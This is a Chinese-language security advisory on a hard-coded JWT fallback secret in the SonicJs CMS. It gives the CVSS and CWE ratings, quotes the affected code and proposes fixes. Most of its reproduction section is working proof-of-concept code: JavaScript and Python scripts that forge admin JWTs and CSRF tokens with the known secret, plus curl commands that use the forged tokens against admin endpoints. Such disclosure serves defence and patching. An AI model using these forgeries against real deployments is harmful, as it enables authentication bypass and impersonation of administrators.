# SONIC-2025-003: JWT Fallback Secret 硬编码导致认证绕过

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [SonicJs-Org/sonicjs](https://github.com/SonicJs-Org/sonicjs) |
| **版本** | main branch (截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 网络/条件依赖 |

## 漏洞概述

SonicJs 在 JWT 签名和 CSRF token 签名中使用了一个公开的硬编码 fallback secret。当部署者没有通过 Cloudflare Workers 的 `wrangler secret` 设置 `JWT_SECRET` 环境变量时（这在快速部署、demo、或配置遗漏的场景中很常见），所有 JWT token 都将使用这个公开已知的 secret 签名。

攻击者可以利用这个已知 secret 自行构造合法的 admin JWT，完全绕过认证。

## 漏洞代码

**文件**: `packages/core/src/middleware/auth.ts` (第12行)

```typescript
// Fallback JWT secret for local development only (no wrangler secret set)
const JWT_SECRET_FALLBACK = 'your-super-secret-jwt-key-change-in-production'
```

**使用位置** (第173行 `generateToken`):
```typescript
static async generateToken(userId, email, role, secret?, expiresInSeconds?) {
  // ...
  return await sign(payload, secret || JWT_SECRET_FALLBACK, 'HS256')
  //                                   ^^^^^^^^^^^^^^^^^^^^^^^^
  //                                   如果 c.env.JWT_SECRET 未设置，使用 fallback
}
```

**使用位置** (第207行 `verifyToken`):
```typescript
static async verifyToken(token, secret?, graceSeconds = 0) {
  const effectiveSecret = secret || JWT_SECRET_FALLBACK
  // ...
  payload = await verify(token, effectiveSecret, 'HS256')
}
```

**同样的 fallback 也用于 CSRF**:

**文件**: `packages/core/src/middleware/csrf.ts` (第18行)
```typescript
const JWT_SECRET_FALLBACK = 'your-super-secret-jwt-key-change-in-production'
```

## 条件

此漏洞在以下情况下可被利用：
1. 部署者没有设置 `JWT_SECRET` wrangler secret（`wrangler secret put JWT_SECRET`）
2. 或者 `c.env.JWT_SECRET` 为 undefined/空值

根据代码注释和文档，这是一个容易被忽略的配置步骤。

## PoC (概念验证)

```javascript
// 攻击者用已知 secret 构造 admin JWT
const jose = require('jose')

const secret = new TextEncoder().encode('your-super-secret-jwt-key-change-in-production')

const token = await new jose.SignJWT({
  userId: 'admin-user-id',
  email: 'admin@sonicjs.com',
  role: 'admin',
  exp: Math.floor(Date.now() / 1000) + 86400,
  iat: Math.floor(Date.now() / 1000)
})
  .setProtectedHeader({ alg: 'HS256' })
  .sign(secret)

console.log('Forged admin token:', token)
```

```bash
# 使用伪造的 token 访问 admin
curl -H "Authorization: Bearer <forged-token>" \
  https://target.workers.dev/admin/dashboard
```

## 修复建议

### 方案1（推荐）：启动时强制检查

```typescript
// 在应用初始化时，如果 JWT_SECRET 未设置则拒绝启动
export function validateJwtSecret(env: Record<string, any>): void {
  if (!env.JWT_SECRET || env.JWT_SECRET === JWT_SECRET_FALLBACK) {
    if (env.ENVIRONMENT === 'production') {
      throw new Error(
        'FATAL: JWT_SECRET is not configured. ' +
        'Run: wrangler secret put JWT_SECRET'
      )
    }
    console.warn(
      '⚠️  WARNING: Using fallback JWT secret. ' +
      'This is insecure for any non-local deployment.'
    )
  }
}
```

### 方案2：移除 fallback，强制要求配置

```typescript
static async generateToken(userId, email, role, secret?, expiresInSeconds?) {
  if (!secret) {
    throw new Error('JWT_SECRET is required. Set it via: wrangler secret put JWT_SECRET')
  }
  // ...
}
```

### 方案3：随机生成 fallback（每次部署不同）

```typescript
// 至少让每个实例的 fallback 不同
const JWT_SECRET_FALLBACK = crypto.randomUUID() // 重启后失效但至少不可预测
```

## 本地复现步骤（手把手）

> 前置条件：参考 [sonicjs-local-setup.md](sonicjs-local-setup.md) 完成环境搭建。

### 1. 确认本地环境未设置 JWT_SECRET

```bash
cd sonicjs/my-sonicjs-app

# 检查 wrangler.toml，确认 [vars] 中没有 JWT_SECRET
grep -i "JWT_SECRET" wrangler.toml
# 应该没有输出

# 也可以检查 .dev.vars 文件（如果存在）
cat .dev.vars 2>/dev/null || echo "no .dev.vars file"
```

默认情况下 `JWT_SECRET` 不在 `wrangler.toml` 中配置（它应该通过 `wrangler secret put JWT_SECRET` 设置），所以本地开发一定使用 fallback。

### 2. 启动服务并正常登录获取一个合法 token

```bash
# 启动服务
npx wrangler dev

# 在另一个终端，创建用户并登录
curl -s -X POST http://localhost:8787/auth/seed-admin
RESPONSE=$(curl -s -X POST http://localhost:8787/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sonicjs.com","password":"sonicjs!"}')

REAL_TOKEN=$(echo $RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Real token: $REAL_TOKEN"

# 解码 JWT 查看结构（不需要 secret，header 和 payload 是 base64）
echo $REAL_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

**预期输出**（JWT payload 结构）：
```json
{
  "userId": "admin-user-id",
  "email": "admin@sonicjs.com",
  "role": "admin",
  "exp": 1750000000,
  "iat": 1747400000
}
```

### 3. 用已知 fallback secret 伪造任意 JWT

```bash
# 安装 jose 库（或使用 python）
npm install jose

# 创建伪造脚本
cat > /tmp/forge-jwt.mjs << 'EOF'
import { SignJWT } from 'jose'

// 这是 SonicJs 源码中硬编码的 fallback secret
const KNOWN_SECRET = 'your-super-secret-jwt-key-change-in-production'
const secret = new TextEncoder().encode(KNOWN_SECRET)

// 伪造一个 admin token —— 可以是任意不存在的用户
const token = await new SignJWT({
  userId: 'forged-admin-id-12345',
  email: 'forged-admin@attacker.com',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60) // 30天有效
})
  .setProtectedHeader({ alg: 'HS256' })
  .sign(secret)

console.log('=== FORGED ADMIN JWT ===')
console.log(token)
console.log('')
console.log('Payload:')
const payload = JSON.parse(atob(token.split('.')[1]))
console.log(JSON.stringify(payload, null, 2))
EOF

node /tmp/forge-jwt.mjs
```

**预期输出**：
```
=== FORGED ADMIN JWT ===
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJmb3JnZWQtYWRt...

Payload:
{
  "userId": "forged-admin-id-12345",
  "email": "forged-admin@attacker.com",
  "role": "admin",
  "iat": 1747400000,
  "exp": 1750000000
}
```

### 4. 用伪造 token 访问 admin API

```bash
FORGED_TOKEN="<上一步输出的 token>"

# 测试：访问需要认证的 admin 端点
curl -s -H "Authorization: Bearer $FORGED_TOKEN" \
  http://localhost:8787/auth/me | python3 -m json.tool

# 注意：/auth/me 会查数据库，如果 userId 不存在会返回 404
# 但 requireAuth() 中间件本身会通过 —— 因为签名验证通过了
```

### 5. 伪造已知用户的 token（完整利用）

```bash
# 先查询真实 admin 的 userId
npx wrangler d1 execute DB --local \
  --command="SELECT id, email, role FROM users WHERE role='admin' LIMIT 1;"
# 假设输出 id = "admin-user-id"

# 用真实 userId 伪造 token
cat > /tmp/forge-real.mjs << 'EOF'
import { SignJWT } from 'jose'

const KNOWN_SECRET = 'your-super-secret-jwt-key-change-in-production'
const secret = new TextEncoder().encode(KNOWN_SECRET)

// 使用真实的 admin userId
const token = await new SignJWT({
  userId: 'admin-user-id',   // ← 替换为数据库中查到的真实 ID
  email: 'admin@sonicjs.com',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60)
})
  .setProtectedHeader({ alg: 'HS256' })
  .sign(secret)

console.log(token)
EOF

FORGED_TOKEN=$(node /tmp/forge-real.mjs)

# 现在完全冒充真实 admin
curl -s -H "Authorization: Bearer $FORGED_TOKEN" \
  http://localhost:8787/auth/me | python3 -m json.tool
```

**预期输出**：
```json
{
  "user": {
    "id": "admin-user-id",
    "email": "admin@sonicjs.com",
    "username": "admin",
    "first_name": "Admin",
    "last_name": "User",
    "role": "admin"
  }
}
```

### 6. 同样的 secret 也影响 CSRF token

```bash
# CSRF token 也用相同的 fallback 签名
# 攻击者可以伪造 CSRF token 绕过 CSRF 保护
cat > /tmp/forge-csrf.mjs << 'EOF'
import { SignJWT } from 'jose'

const KNOWN_SECRET = 'your-super-secret-jwt-key-change-in-production'

// CSRF token 格式: <nonce>.<hmac_signature>
// 用 Web Crypto 模拟 SonicJs 的 generateCsrfToken()
const encoder = new TextEncoder()
const key = await crypto.subtle.importKey(
  'raw', encoder.encode(KNOWN_SECRET),
  { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
)

// 生成随机 nonce
const nonceBytes = new Uint8Array(32)
crypto.getRandomValues(nonceBytes)
const nonce = btoa(String.fromCharCode(...nonceBytes))
  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')

// 签名
const sig = await crypto.subtle.sign('HMAC', key, encoder.encode(nonce))
const signature = btoa(String.fromCharCode(...new Uint8Array(sig)))
  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')

console.log(`Forged CSRF: ${nonce}.${signature}`)
EOF

node /tmp/forge-csrf.mjs
```

### 7. Python 版 PoC（无需 npm）

```python
#!/usr/bin/env python3
"""SonicJs JWT Forgery PoC - 使用已知 fallback secret"""

import hmac
import hashlib
import base64
import json
import time

SECRET = 'your-super-secret-jwt-key-change-in-production'

def base64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt(user_id: str, email: str, role: str = 'admin') -> str:
    header = {"alg": "HS256"}
    payload = {
        "userId": user_id,
        "email": email,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 30 * 86400  # 30 days
    }

    segments = [
        base64url_encode(json.dumps(header).encode()),
        base64url_encode(json.dumps(payload).encode()),
    ]

    signing_input = f"{segments[0]}.{segments[1]}"
    signature = hmac.new(
        SECRET.encode(), signing_input.encode(), hashlib.sha256
    ).digest()
    segments.append(base64url_encode(signature))

    return '.'.join(segments)

if __name__ == '__main__':
    token = forge_jwt('admin-user-id', 'admin@sonicjs.com', 'admin')
    print(f"Forged token: {token}")
    print(f"\nTest with:")
    print(f"  curl -H 'Authorization: Bearer {token}' http://localhost:8787/auth/me")
```

### 关键观察点

- `wrangler.toml` 的 `[vars]` 中没有 `JWT_SECRET`（也不应该有，因为 secret 不该明文存储在代码中）
- 正确做法是 `wrangler secret put JWT_SECRET`，但很多用户不知道或遗忘这一步
- fallback secret 写在开源代码中，任何人都能看到
- 一旦使用 fallback，所有 JWT 和 CSRF token 的安全性归零

## 参考

- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [OWASP: Use of Hard-coded Password](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)
- [Cloudflare Workers Secrets](https://developers.cloudflare.com/workers/configuration/secrets/)
